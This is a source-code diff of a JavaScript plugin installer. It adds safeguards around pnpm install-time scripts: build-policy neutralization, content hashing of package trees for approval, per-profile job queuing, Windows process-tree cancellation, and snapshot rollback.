@@ -6,13 +6,17 @@
 // command does (see @deepseek-ai/dsh/lib/plugin-*.js), reusing the public
 // @deepseek-ai/dsh-app-boot APIs for profile resolution and initialization.
 
-import { spawn } from "node:child_process";
-import { existsSync, readFileSync, writeFileSync, rmSync } from "node:fs";
-import { join } from "node:path";
+import { spawn, spawnSync } from "node:child_process";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, rmSync, readdirSync, statSync, lstatSync, realpathSync, readlinkSync } from "node:fs";
+import { basename, dirname, join, relative, resolve, isAbsolute, sep } from "node:path";
 import { createRequire } from "node:module";
-import { load } from "js-yaml";
+import { EventEmitter } from "node:events";
+import { tmpdir } from "node:os";
+import { createHash } from "node:crypto";
+import { dump, load } from "js-yaml";
 import { DEFAULT_PROFILE_BUNDLES, PROFILE_TEMPLATES, initProfile, resolveProfileDir } from "@deepseek-ai/dsh-app-boot";
 import { describeBuildScripts, npmNameOf } from "./github.js";
+import { commitPendingSnapshot, createProfileSnapshot, markPendingSnapshot, pnpmGuardEnv, rollbackPendingSnapshot } from "./guard.js";
 
 // ── spec normalization ──────────────────────────────────────────────────────
 
@@ -392,7 +396,20 @@ function parseIgnoredBuilds(output) {
       // dropped instead of being written to the YAML.
       const suffix = /@(?:([\w.+-]+)|https?:\/\/\S+|file:\S+|link:\S+|github:\S+)$/.exec(candidate);
       const name = suffix === null ? candidate : candidate.slice(0, suffix.index);
-      if (NPM_NAME_RE.test(name) && !found.has(name)) found.set(name, { name, version: suffix?.[1] });
+      // Keep pnpm's exact selector (for example
+      // `fixture-native-pkg@file:../pkg`). `allowBuilds` matches that selector,
+      // not always the bare package name. It is never accepted from a caller:
+      // it comes only from pnpm's own single-line diagnostic and is rendered
+      // back through js-yaml, after rejecting control characters.
+      const selector = candidate;
+      if (
+        NPM_NAME_RE.test(name)
+        && selector.length <= 512
+        && !/[\u0000-\u001f\u007f]/.test(selector)
+        && !found.has(selector)
+      ) {
+        found.set(selector, { name, version: suffix?.[1], selector });
+      }
     }
   }
   return [...found.values()];
@@ -460,6 +477,9 @@ export function mergeAllowBuilds(content, names) {
     const base = lines.join("\n");
     next = `${base.endsWith("\n") ? base : `${base}\n`}\nallowBuilds:\n${additions.map(render).join("\n")}\n`;
   } else {
+    if (/^allowBuilds\s*:\s*(\{\}|\[\])\s*$/.test(lines[keyIndex])) {
+      lines[keyIndex] = "allowBuilds:";
+    }
     // 块内 = 缩进行；空行不终止块；顶格行是下一个 key。
     let insertIndex = keyIndex + 1;
     for (let index = keyIndex + 1; index < lines.length; index++) {
@@ -471,6 +491,409 @@ export function mergeAllowBuilds(content, names) {
     next = lines.join("\n");
   }
   return next;
+}
+
+/**
+ * Neutralize allowBuilds in pnpm-workspace.yaml so that all lifecycle scripts
+ * are strictly blocked by pnpm on the initial install.
+ * @param content - current pnpm-workspace.yaml contents.
+ * @returns the neutralized workspace yaml.
+ */
+export function neutralizeWorkspaceContent(content) {
+  const source = typeof content === "string" ? content : DEFAULT_WORKSPACE_YAML;
+  let parsed;
+  try {
+    parsed = load(source);
+  } catch (error) {
+    throw new Error(`pnpm-workspace.yaml does not parse, refusing to run an install: ${error.message}`);
+  }
+  if (parsed === null || parsed === undefined) parsed = {};
+  if (typeof parsed !== "object" || Array.isArray(parsed)) {
+    throw new Error("pnpm-workspace.yaml root must be a mapping");
+  }
+  parsed.allowBuilds = {};
+  parsed.onlyBuiltDependencies = [];
+  parsed.dangerouslyAllowAllBuilds = false;
+  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
+}
+
+/** Enable exactly the selectors pnpm itself reported while every broad build
+ * policy switch stays disabled. The caller restores these temporary bytes as
+ * soon as the rebuild process closes. */
+export function enableApprovedBuildSelectors(content, selectors) {
+  const parsed = load(neutralizeWorkspaceContent(content));
+  const allowBuilds = {};
+  for (const raw of Array.isArray(selectors) ? selectors : []) {
+    const selector = String(raw ?? "");
+    if (selector.length === 0 || selector.length > 512 || /[\u0000-\u001f\u007f]/.test(selector)) {
+      throw new Error(`invalid pnpm build selector ${JSON.stringify(raw)}`);
+    }
+    allowBuilds[selector] = true;
+  }
+  if (Object.keys(allowBuilds).length === 0) throw new Error("no build selectors were approved");
+  parsed.allowBuilds = allowBuilds;
+  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
+}
+
+/** Legacy package.json policy may authorize scripts before the workspace gate
+ * sees them. Refuse it: restoring the whole manifest after a successful add
+ * would also erase the newly installed dependency. */
+export function assertNoManifestBuildBypass(profileDir) {
+  const manifest = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
+  const pnpm = manifest?.pnpm;
+  if (pnpm && typeof pnpm === "object") {
+    if (pnpm.dangerouslyAllowAllBuilds === true) throw new Error("package.json pnpm.dangerouslyAllowAllBuilds=true would bypass install-script approval");
+    if (Array.isArray(pnpm.onlyBuiltDependencies) && pnpm.onlyBuiltDependencies.length > 0) throw new Error("package.json pnpm.onlyBuiltDependencies pre-authorizes install scripts");
+    if (pnpm.allowBuilds && typeof pnpm.allowBuilds === "object" && Object.values(pnpm.allowBuilds).some((value) => value === true)) {
+      throw new Error("package.json pnpm.allowBuilds pre-authorizes install scripts");
+    }
+  }
+  const dependenciesMeta = manifest?.dependenciesMeta;
+  if (dependenciesMeta && typeof dependenciesMeta === "object") {
+    for (const [selector, metadata] of Object.entries(dependenciesMeta)) {
+      if (metadata?.built === true) throw new Error(`package.json dependenciesMeta.${selector}.built=true would bypass install-script approval`);
+    }
+  }
+}
+
+/**
+ * Deterministically hash the normalized package tree of a materialized package.
+ * Computes SHA-256 over relative POSIX file paths and raw file bytes.
+ * Rejects symlink escapes pointing outside the package directory.
+ * @param pkgDir - absolute path to the materialized package directory.
+ * @returns SHA-256 hex string.
+ */
+export function hashPackageTree(pkgDir) {
+  if (typeof pkgDir !== "string" || !existsSync(pkgDir)) {
+    throw new Error(`cannot hash package tree: directory ${JSON.stringify(pkgDir)} does not exist`);
+  }
+  const realRoot = realpathSync(pkgDir);
+  const hash = createHash("sha256");
+  const files = [];
+  const visitedDirectories = new Set();
+
+  function walk(currentDir) {
+    const currentReal = realpathSync(currentDir);
+    if (visitedDirectories.has(currentReal)) {
+      throw new Error(`symlink cycle detected in package tree at ${currentDir}`);
+    }
+    visitedDirectories.add(currentReal);
+    let entries;
+    try {
+      entries = readdirSync(currentDir, { withFileTypes: true });
+    } catch (err) {
+      throw new Error(`cannot read directory ${currentDir}: ${err.message}`);
+    }
+    entries.sort((a, b) => a.name.localeCompare(b.name));
+    for (const entry of entries) {
+      const entryName = entry.name;
+      // npm excludes .git metadata from packed artifacts. Package-local
+      // node_modules is NOT skipped: bundledDependencies are executable bytes
+      // belonging to the artifact and must be covered by the approval proof.
+      if (entryName === ".git") continue;
+
+      const fullPath = join(currentDir, entryName);
+      let lstat;
+      try {
+        lstat = lstatSync(fullPath);
+      } catch (err) {
+        throw new Error(`cannot stat ${fullPath}: ${err.message}`);
+      }
+
+      if (lstat.isSymbolicLink()) {
+        let targetReal;
+        try {
+          targetReal = realpathSync(fullPath);
+        } catch (err) {
+          throw new Error(`unresolvable symlink ${fullPath}: ${err.message}`);
+        }
+        const rel = relative(realRoot, targetReal);
+        if (rel === ".." || rel.startsWith(`..${sep}`) || isAbsolute(rel)) {
+          throw new Error(`symlink escape detected in package tree: ${fullPath} points outside package root to ${targetReal}`);
+        }
+        let targetStat;
+        try {
+          targetStat = statSync(targetReal);
+        } catch (err) {
+          throw new Error(`cannot stat symlink target ${targetReal}: ${err.message}`);
+        }
+        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
+        const linkTarget = readlinkSync(fullPath).replace(/\\/g, "/");
+        hash.update(`link:${relPath}\0${linkTarget}\0${lstat.mode & 0o777}\0`);
+        if (targetStat.isDirectory()) {
+          walk(fullPath);
+        } else if (targetStat.isFile()) {
+          files.push({ relPath, fullPath: targetReal, mode: targetStat.mode & 0o777 });
+        }
+      } else if (lstat.isDirectory()) {
+        walk(fullPath);
+      } else if (lstat.isFile()) {
+        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
+        files.push({ relPath, fullPath, mode: lstat.mode & 0o777 });
+      }
+    }
+    visitedDirectories.delete(currentReal);
+  }
+
+  walk(realRoot);
+  files.sort((a, b) => a.relPath.localeCompare(b.relPath));
+
+  for (const { relPath, fullPath, mode } of files) {
+    let content;
+    try {
+      content = readFileSync(fullPath);
+    } catch (err) {
+      throw new Error(`cannot read file ${fullPath} during package hashing: ${err.message}`);
+    }
+    hash.update(`file:${relPath}\0${mode}\0${content.length}\0`);
+    hash.update(content);
+  }
+
+  return hash.digest("hex");
+}
+
+/**
+ * Locate a materialized package under <profileDir>/node_modules or .pnpm virtual store.
+ * Strictly never falls back to ancestor node resolution.
+ * @param profileDir - target profile directory.
+ * @param pkgName - npm package name.
+ * @param version - optional specific version.
+ * @returns {{ dir: string, manifest: object }}
+ */
+export function findMaterializedPackage(profileDir, pkgName, version) {
+  if (typeof pkgName !== "string" || !NPM_NAME_RE.test(pkgName)) {
+    throw new Error(`invalid package name ${JSON.stringify(pkgName)} for materialized resolution`);
+  }
+  const modulesRoot = resolve(profileDir, "node_modules");
+
+  // 1. Direct candidate path in profileDir/node_modules
+  const direct = resolve(modulesRoot, ...pkgName.split("/"));
+  const directManifestPath = join(direct, "package.json");
+  if (existsSync(directManifestPath)) {
+    try {
+      const manifest = JSON.parse(readFileSync(directManifestPath, "utf8"));
+      if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
+        if (!version || manifest.version === version) {
+          const realDir = realpathSync(direct);
+          return { dir: realDir, manifest };
+        }
+      }
+    } catch {
+      /* fallback to .pnpm */
+    }
+  }
+
+  // 2. Search in node_modules/.pnpm virtual store
+  const pnpmDir = join(modulesRoot, ".pnpm");
+  const matches = [];
+  if (existsSync(pnpmDir)) {
+    try {
+      const entries = readdirSync(pnpmDir, { withFileTypes: true });
+      for (const entry of entries) {
+        if (!entry.isDirectory()) continue;
+        const candidatePath = join(pnpmDir, entry.name, "node_modules", ...pkgName.split("/"));
+        const mPath = join(candidatePath, "package.json");
+        if (existsSync(mPath)) {
+          try {
+            const manifest = JSON.parse(readFileSync(mPath, "utf8"));
+            if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
+              if (!version || manifest.version === version) {
+                matches.push({ dir: realpathSync(candidatePath), manifest });
+              }
+            }
+          } catch {}
+        }
+      }
+    } catch {}
+  }
+
+  const uniqueMatches = [];
+  const seenPaths = new Set();
+  for (const match of matches) {
+    if (!seenPaths.has(match.dir)) {
+      seenPaths.add(match.dir);
+      uniqueMatches.push(match);
+    }
+  }
+
+  if (uniqueMatches.length === 1) {
+    return uniqueMatches[0];
+  }
+  if (uniqueMatches.length > 1) {
+    throw new Error(`ambiguous materialized package resolution for ${pkgName}${version ? `@${version}` : ""}: multiple distinct copies found in .pnpm`);
+  }
+
+  throw new Error(`cannot locate materialized package directory for ${pkgName}${version ? `@${version}` : ""} in ${profileDir}`);
+}
+
+/** Extract sorted lifecycle script commands (preinstall, install, postinstall) from manifest. */
+export function extractLifecycleScripts(manifest) {
+  const scripts = {};
+  const raw = manifest?.scripts;
+  if (raw && typeof raw === "object") {
+    for (const key of ["preinstall", "install", "postinstall"]) {
+      if (typeof raw[key] === "string" && raw[key].trim().length > 0) {
+        scripts[key] = raw[key];
+      }
+    }
+  }
+  return scripts;
+}
+
+/** Resolve direct candidate package name from profile state, spec, or preflight. */
+export function resolveCandidateName(profileDir, spec, beforeDeps = new Set(), preflight) {
+  if (preflight?.candidate?.name && typeof preflight.candidate.name === "string") {
+    return preflight.candidate.name;
+  }
+  const manifestPath = join(profileDir, "package.json");
+  if (existsSync(manifestPath)) {
+    try {
+      const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
+      const newDeps = Object.keys(manifest.dependencies ?? {}).filter((d) => !beforeDeps.has(d));
+      if (newDeps.length === 1) return newDeps[0];
+    } catch {}
+  }
+  if (typeof spec === "string") {
+    const raw = spec.trim();
+    if (/^(?:file:|link:)/i.test(raw)) {
+      const localDir = resolve(profileDir, raw.replace(/^(?:file:|link:)/i, "").replace(/[\\/]+$/, ""));
+      const localPkg = join(localDir, "package.json");
+      if (existsSync(localPkg)) {
+        try {
+          const m = JSON.parse(readFileSync(localPkg, "utf8"));
+          if (m?.name) return m.name;
+        } catch {}
+      }
+    }
+    const name = npmNameOf(raw);
+    if (name) return name;
+  }
+  const modulesRoot = join(profileDir, "node_modules");
+  if (existsSync(modulesRoot)) {
+    try {
+      const entries = readdirSync(modulesRoot, { withFileTypes: true });
+      for (const entry of entries) {
+        if (entry.name === ".pnpm" || entry.name.startsWith(".")) continue;
+        if (entry.name.startsWith("@")) {
+          const scopeEntries = readdirSync(join(modulesRoot, entry.name), { withFileTypes: true });
+          for (const se of scopeEntries) {
+            const fullName = `${entry.name}/${se.name}`;
+            if (!beforeDeps.has(fullName)) return fullName;
+          }
+        } else if (!beforeDeps.has(entry.name)) {
+          return entry.name;
+        }
+      }
+    } catch {}
+  }
+  return undefined;
+}
+
+/**
+ * Compute the canonical artifact proof from the materialized package tree.
+ * Includes direct candidate identity (and content hash) even when its own
+ * scripts are not blocked, plus every blocked package with resolved name, version,
+ * sorted lifecycle scripts, and content hash.
+ * @param profileDir - target profile directory.
+ * @param candidateName - candidate package name.
+ * @param ignoredList - array of {name, version} or string names blocked by pnpm.
+ * @returns canonical proof object.
+ */
+export function computeMaterializedProof(profileDir, candidateName, ignoredList = []) {
+  if (!candidateName) {
+    throw new Error("cannot compute materialized proof: candidate package name is missing or unresolved");
+  }
+  const candidatePkg = findMaterializedPackage(profileDir, candidateName);
+  const candidateScripts = extractLifecycleScripts(candidatePkg.manifest);
+  const candidateHash = hashPackageTree(candidatePkg.dir);
+  const candidateProof = {
+    name: candidatePkg.manifest.name ?? candidateName,
+    version: candidatePkg.manifest.version ?? "unknown",
+    scripts: candidateScripts,
+    contentHash: candidateHash,
+  };
+
+  const blockedPackages = [];
+  const seen = new Set();
+  for (const entry of ignoredList) {
+    const pkgName = typeof entry === "string" ? entry.trim() : entry?.name?.trim();
+    const selector = typeof entry === "object" && typeof entry?.selector === "string" ? entry.selector : pkgName;
+    if (!pkgName || !selector || seen.has(selector)) continue;
+    seen.add(selector);
+    const version = typeof entry === "object" ? entry.version : undefined;
+    const pkg = findMaterializedPackage(profileDir, pkgName, version);
+    const scripts = extractLifecycleScripts(pkg.manifest);
+    const contentHash = hashPackageTree(pkg.dir);
+    blockedPackages.push({
+      name: pkg.manifest.name ?? pkgName,
+      version: pkg.manifest.version ?? "unknown",
+      selector,
+      direct: pkgName === candidateName,
+      scripts,
+      contentHash,
+    });
+  }
+
+  blockedPackages.sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector));
+
+  return {
+    candidate: candidateProof,
+    blockedPackages,
+  };
+}
+
+/** Deterministically serialize a canonical proof object into canonical JSON. */
+export function serializeCanonicalProof(proof) {
+  if (!proof || typeof proof !== "object") return "";
+  const normalizeScripts = (scripts) => {
+    const out = {};
+    if (scripts && typeof scripts === "object") {
+      for (const key of ["preinstall", "install", "postinstall"]) {
+        if (typeof scripts[key] === "string") out[key] = scripts[key];
+      }
+    }
+    return out;
+  };
+  const normalizePkg = (pkg) => ({
+    name: String(pkg?.name ?? ""),
+    version: String(pkg?.version ?? ""),
+    selector: String(pkg?.selector ?? pkg?.name ?? ""),
+    direct: Boolean(pkg?.direct),
+    scripts: normalizeScripts(pkg?.scripts),
+    contentHash: String(pkg?.contentHash ?? ""),
+  });
+  const canonicalObj = {
+    candidate: {
+      name: String(proof.candidate?.name ?? ""),
+      version: String(proof.candidate?.version ?? ""),
+      scripts: normalizeScripts(proof.candidate?.scripts),
+      contentHash: String(proof.candidate?.contentHash ?? ""),
+    },
+    blockedPackages: Array.isArray(proof.blockedPackages)
+      ? proof.blockedPackages.map(normalizePkg).sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector))
+      : [],
+  };
+  return JSON.stringify(canonicalObj);
+}
+
+/** Merge optional registry reputation facts with authoritative bytes read from
+ * the materialized package. Security fields always come from the proof. */
+export function disclosureFromMaterializedProof(proof, hints = []) {
+  const hintList = Array.isArray(hints) ? hints : [];
+  return (Array.isArray(proof?.blockedPackages) ? proof.blockedPackages : []).map((actual) => {
+    const hint = hintList.find((entry) => entry?.name === actual.name && (entry?.version === undefined || entry.version === actual.version)) ?? {};
+    return {
+      weeklyDownloads: hint.weeklyDownloads,
+      provenance: hint.provenance,
+      unpackedSize: hint.unpackedSize,
+      name: actual.name,
+      version: actual.version,
+      selector: actual.selector,
+      direct: actual.direct,
+      scripts: actual.scripts,
+      contentHash: actual.contentHash,
+    };
+  });
 }
 
 /** Default pnpm-workspace.yaml for a profile that has none yet. */
@@ -521,10 +944,10 @@ export function createJobTracker() {
     }
   };
   return {
-    start({ profile, spec, verb = "add", allowBuildScripts }) {
+    start({ profile, spec, verb = "add", allowBuildScripts, approvedProof, preflight, onSettled }) {
       const id = `market-${++trackerCounter}`;
       const kind = verb === "remove" ? "dsh-plugin-uninstall" : "dsh-plugin-install";
-      const producer = verb === "remove" ? runRemove({ profile, packageName: spec }) : runInstall({ profile, spec, allowBuildScripts });
+      const producer = verb === "remove" ? runRemove({ profile, packageName: spec }) : runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight });
       const record = {
         id,
         kind,
@@ -544,6 +967,7 @@ export function createJobTracker() {
         // 一段文本，用户看不出要批准的到底是什么。
         record.needsApproval = outcome.needsApproval;
         record.finishedAt = Date.now();
+        onSettled?.(outcome);
       });
       records.set(id, record);
       prune();
@@ -627,6 +1051,147 @@ async function enablePnpmViaCorepack(push) {
   });
 }
 
+// ── per-profile transaction serialization ───────────────────────────────────
+//
+// Install and remove mutate the same profile files (package.json, lockfile,
+// workspace yaml, patch layer) and node_modules. Two pnpm processes running
+// concurrently in one profile interleave those writes and can corrupt both
+// transactions. Every producer — add AND remove — therefore runs through a
+// per-profile in-process queue: a job starts only after the previous one
+// reached a terminal state, and the lock is released on every outcome
+// (completed/failed/killed) and on internal errors.
+
+const profileQueues = new Map(); // lockKey -> Promise<void> tail
+
+/** Lock key for a profile: the resolved dir when the name is valid. */
+function profileLockKey(profile) {
+  try {
+    return resolveProfileDir(profile);
+  } catch {
+    return `invalid:${String(profile)}`;
+  }
+}
+
+function enqueueProfileTask(lockKey, task) {
+  const key = String(lockKey);
+  const tail = profileQueues.get(key) ?? Promise.resolve();
+  const run = tail.then(task, task);
+  // The stored tail never rejects, so one poisoned task can never stall the
+  // queue; it is dropped from the map once it is the latest settled tail.
+  const stored = run.then(() => undefined, () => undefined);
+  profileQueues.set(key, stored);
+  void stored.then(() => {
+    if (profileQueues.get(key) === stored) profileQueues.delete(key);
+  });
+  return run;
+}
+
+/**
+ * Run a producer factory under the profile's queue. The returned producer
+ * settles `done` with the inner producer's outcome; cancel() before the job
+ * starts settles it as killed without ever spawning pnpm. `done` ALWAYS
+ * resolves with an outcome object — never rejects — so callers (and the
+ * queue itself) have exactly one settlement path.
+ */
+function serializedProducer(lockKey, start) {
+  let inner;
+  let cancelRequested = false;
+  const done = enqueueProfileTask(lockKey, () => {
+    if (cancelRequested) {
+      return { status: "killed", detail: "cancelled while queued behind another profile transaction — pnpm never ran" };
+    }
+    try {
+      inner = start();
+    } catch (error) {
+      return { status: "failed", detail: error?.message ?? String(error) };
+    }
+    return Promise.resolve(inner.done).then(
+      (outcome) => outcome,
+      (error) => ({ status: "failed", detail: `internal error: ${error?.message ?? String(error)}` }),
+    );
+  });
+  return {
+    cancel: () => {
+      cancelRequested = true;
+      inner?.cancel();
+    },
+    done,
+    readOutput: () => inner?.readOutput() ?? "",
+  };
+}
+
+// ── pnpm spawn plan (Windows cancel correctness) ────────────────────────────
+//
+// Killing a shell-wrapped process kills the WRAPPER, not pnpm: on Windows
+// `shell: true` spawns `cmd /d /s /c pnpm ...`, and proc.kill() terminates
+// cmd.exe while the real pnpm (a grandchild) keeps running — and keeps
+// mutating the profile while rollback restores it. So: spawn pnpm without a
+// shell wherever the platform allows it, and when Windows forces a wrapper
+// (a .cmd shim cannot be spawned with shell:false on modern Node), cancel
+// terminates the whole process tree and the done chain waits for the
+// wrapper's 'close' before any rollback runs.
+
+/** First `binary<ext>` found on PATH, or undefined. */
+function findOnPath(binary, { platform, pathEnv, extensions }) {
+  const separator = platform === "win32" ? ";" : ":";
+  for (const dir of String(pathEnv ?? "").split(separator)) {
+    if (dir.length === 0) continue;
+    for (const ext of extensions) {
+      const candidate = join(dir, `${binary}${ext}`);
+      if (existsSync(candidate)) return candidate;
+    }
+  }
+  return undefined;
+}
+
+/**
+ * How to spawn pnpm on this platform.
+ * @returns {{ command: string, shell: boolean, treeKill: boolean }}
+ *   treeKill marks the shell-wrapped case: cancel must taskkill /T the tree.
+ */
+function pnpmSpawnPlan({ platform = process.platform, pathEnv = process.env.PATH } = {}) {
+  if (platform !== "win32") return { command: "pnpm", shell: false, treeKill: false };
+  // A real .exe spawns without a shell — cancel then kills pnpm itself.
+  const exe = findOnPath("pnpm", { platform, pathEnv, extensions: [".exe"] });
+  if (exe !== undefined) return { command: exe, shell: false, treeKill: false };
+  // Only the .cmd shim: Node refuses batch files with shell:false (EINVAL
+  // since the batch-file argument-injection fix), so a cmd wrapper is
+  // unavoidable — flag it so cancel kills the whole tree, not the wrapper.
+  const cmd = findOnPath("pnpm", { platform, pathEnv, extensions: [".cmd"] });
+  return { command: cmd ?? "pnpm", shell: true, treeKill: true };
+}
+
+/**
+ * Terminate a shell-wrapped process tree (Windows): taskkill /T /F kills the
+ * wrapper AND its descendants, synchronously, so cancel() returns only after
+ * the tree is signalled; the wrapper's 'close' then resolves the done chain
+ * and rollback runs strictly after every pnpm process has exited.
+ */
+function killProcessTree(proc) {
+  if (process.platform !== "win32" || typeof proc?.pid !== "number") {
+    try { proc?.kill(); } catch { /* already gone */ }
+    return;
+  }
+  try {
+    spawnSync("taskkill", ["/pid", String(proc.pid), "/T", "/F"], { stdio: "ignore", windowsHide: true, timeout: 10000 });
+  } catch { /* taskkill missing — fall through to a plain kill */ }
+  try { proc.kill(); } catch { /* already gone */ }
+}
+
+/** Kill the in-flight pnpm spawn, tree-killing when it runs in a shell wrapper. */
+function cancelSpawned(current) {
+  if (current === undefined || current === null) return;
+  if (current.treeKill === true) killProcessTree(current.proc);
+  else {
+    try { current.proc.kill(); } catch { /* already exited */ }
+  }
+}
+
+/** Mirrors guard.js pendingPath(): <home>/guard/pending-<profile>.json. */
+function pendingMarkerPath(profileDir) {
+  return join(dirname(dirname(profileDir)), "guard", `pending-${basename(profileDir)}.json`);
+}
+
 // ── the background install job ──────────────────────────────────────────────
 
 /**
@@ -643,9 +1208,10 @@ async function enablePnpmViaCorepack(push) {
 function renderApprovalNeeded(spec, disclosure) {
   const lines = [
     `installing ${spec} requires running install-time code — approval needed.`,
-    "No install script ran and no plugin code loaded. pnpm did leave the downloaded",
-    "files and a dependency entry in the profile (unusable until the scripts run);",
-    "approving continues from there, and market_uninstall removes them if you cancel.",
+    "No install script ran and no plugin code loaded. The profile was restored",
+    "to its pre-install state. On approval, pnpm resolves again with scripts",
+    "blocked; the materialized bytes and commands must match this disclosure",
+    "before the verified tree is rebuilt. Nothing is left behind if you cancel.",
     "",
   ];
   for (const entry of disclosure) {
@@ -653,7 +1219,9 @@ function renderApprovalNeeded(spec, disclosure) {
       ? "the plugin itself"
       : "a transitive dependency — NOT the package you asked for";
     lines.push(`  ${entry.name}${entry.version ? `@${entry.version}` : ""}   (${origin})`);
+    if (entry.selector) lines.push(`      pnpm selector: ${entry.selector}`);
     for (const [key, command] of Object.entries(entry.scripts ?? {})) lines.push(`      ${key}: ${command}`);
+    if (entry.contentHash) lines.push(`      artifact SHA-256: ${entry.contentHash}`);
     const facts = [];
     if (typeof entry.weeklyDownloads === "number") facts.push(`${entry.weeklyDownloads.toLocaleString()} weekly downloads`);
     facts.push(entry.provenance === true ? "has provenance" : "no provenance");
@@ -666,8 +1234,73 @@ function renderApprovalNeeded(spec, disclosure) {
   return lines.join("\n");
 }
 
-export function runInstall({ profile, spec, allowBuildScripts }) {
-  const profileDir = ensureProfile(profile);
+/**
+ * Args for the live `pnpm add`. Peer auto-install is disabled just like in the
+ * disposable probe install (guard.js probeAddArgs): a marketplace install must
+ * never pull the @deepseek-ai host peer stack into the profile. The spec is
+ * validated by assertSafeSpec before this runs; every other argv entry is a
+ * fixed string.
+ *
+ * strict-dep-builds forces pnpm to FAIL when it blocks a build script instead
+ * of exiting 0 while printing "Ignored build scripts" — which used to bypass
+ * the approval gate entirely and finalize a success with the scripts silently
+ * skipped. The successful output is still inspected (see settle), so even a
+ * pnpm that does not honor the flag cannot slip ignored builds past the gate.
+ */
+function liveAddArgs(spec) {
+  return [
+    "add",
+    spec,
+    "--reporter=append-only",
+    "--config.auto-install-peers=false",
+    "--config.strict-dep-builds=true",
+    "--config.dangerously-allow-all-builds=false",
+  ];
+}
+
+/** Rebuild only the already-materialized packages whose exact pnpm selectors
+ * were approved. Unlike a second `pnpm add <spec>`, this never re-resolves a
+ * mutable file/git/tag spec after the proof comparison. */
+function rebuildApprovedArgs(packageNames) {
+  const names = [...new Set(packageNames)].sort();
+  if (names.length === 0 || names.some((name) => !NPM_NAME_RE.test(name))) {
+    throw new Error("cannot rebuild an empty or invalid approved package set");
+  }
+  return ["rebuild", ...names, "--reporter=append-only"];
+}
+
+/**
+ * Env for the live `pnpm add`. pnpmGuardEnv disables peer auto-install; the
+ * strict-dep-builds pair is the env form of the --config flag above and also
+ * reaches any pnpm the install itself spawns (git-hosted deps, nested runs).
+ */
+function liveAddEnv(base = process.env) {
+  return {
+    ...pnpmGuardEnv(base),
+    npm_config_strict_dep_builds: "true",
+    NPM_CONFIG_STRICT_DEP_BUILDS: "true",
+    npm_config_dangerously_allow_all_builds: "false",
+    NPM_CONFIG_DANGEROUSLY_ALLOW_ALL_BUILDS: "false",
+  };
+}
+
+export function runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }) {
+  // Serialized with every other add/remove targeting the same profile (see
+  // serializedProducer). Underscored arguments are self-test seams; production
+  // callers never pass them. `_restoreWorkspace` exists specifically so the
+  // fail-closed restoration path can be attacked without relying on flaky OS
+  // permission tricks.
+  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
+    runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }));
+}
+
+function runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }) {
+  const profileDir = _profileDir ?? ensureProfile(profile);
+  try {
+    assertNoManifestBuildBypass(profileDir);
+  } catch (error) {
+    return failedNow(`cannot safely probe install scripts for ${spec}: ${error.message}`);
+  }
   // Dependency keys BEFORE pnpm add, so reconcile only manages entries that
   // were (or became) dependencies and never touches template bundles.
   const beforeDeps = new Set(Object.keys(readManifest(profileDir).dependencies ?? {}));
@@ -677,14 +1310,78 @@ export function runInstall({ profile, spec, allowBuildScripts }) {
     collected.push(text);
     deltaQueue.push(text);
   };
+
+  const workspacePath = join(profileDir, "pnpm-workspace.yaml");
+  const originalWorkspaceBytes = existsSync(workspacePath) ? readFileSync(workspacePath) : undefined;
+  let workspaceRestored = false;
+  let workspaceRestoreError;
+  const restoreOriginalWorkspace = () => {
+    if (workspaceRestored) return true;
+    try {
+      if (_restoreWorkspace !== undefined) {
+        _restoreWorkspace(workspacePath, originalWorkspaceBytes);
+      } else if (originalWorkspaceBytes === undefined) {
+        rmSync(workspacePath, { force: true });
+      } else {
+        writeFileSync(workspacePath, originalWorkspaceBytes);
+      }
+      workspaceRestored = true;
+      workspaceRestoreError = undefined;
+      return true;
+    } catch (err) {
+      workspaceRestoreError = err;
+      push(`\n[dsh-plugin-mall] WARNING: could not restore pnpm-workspace.yaml: ${err.message}\n`);
+      return false;
+    }
+  };
+
+  // Snapshot the four profile files and register the pending marker BEFORE the
+  // first live pnpm add runs. These are the files that decide what pnpm
+  // installs and what dsh loads; the marker is what lets startup/CLI recovery
+  // roll the profile back if the plugin proves unloadable.
+  let snapshot;
+  try {
+    snapshot = createProfileSnapshot(profileDir, { spec });
+  } catch (error) {
+    return failedNow(`cannot snapshot profile before installing ${spec}: ${error.message} — refusing to touch the profile`);
+  }
+  try {
+    markPendingSnapshot(snapshot, { spec, preflight });
+  } catch (error) {
+    rmSync(snapshot.dir, { recursive: true, force: true });
+    return failedNow(`cannot register the install pending marker for ${spec}: ${error.message} — refusing to touch the profile`);
+  }
+
+  // Neutralize existing allowBuilds before every first pnpm add so strict-dep-builds
+  // always blocks candidate lifecycle scripts regardless of pre-existing workspace policy.
+  try {
+    if (originalWorkspaceBytes !== undefined) {
+      const neutralized = neutralizeWorkspaceContent(originalWorkspaceBytes.toString("utf8"));
+      writeYamlChecked(workspacePath, neutralized, "pnpm-workspace.yaml");
+    } else {
+      writeYamlChecked(workspacePath, DEFAULT_WORKSPACE_YAML, "pnpm-workspace.yaml");
+    }
+  } catch (error) {
+    const restored = restoreOriginalWorkspace();
+    try {
+      if (restored) commitPendingSnapshot(profileDir);
+      else rollbackPendingSnapshot(profileDir);
+    } catch (cleanupError) {
+      return failedNow(`cannot neutralize workspace build policy before installing ${spec}: ${error.message}; cleanup also failed: ${cleanupError.message}`);
+    }
+    return failedNow(`cannot neutralize workspace allowBuilds before installing ${spec}: ${error.message} — refusing to touch the profile`);
+  }
+
   let current = undefined;
   let pnpmSelfHealed = false;
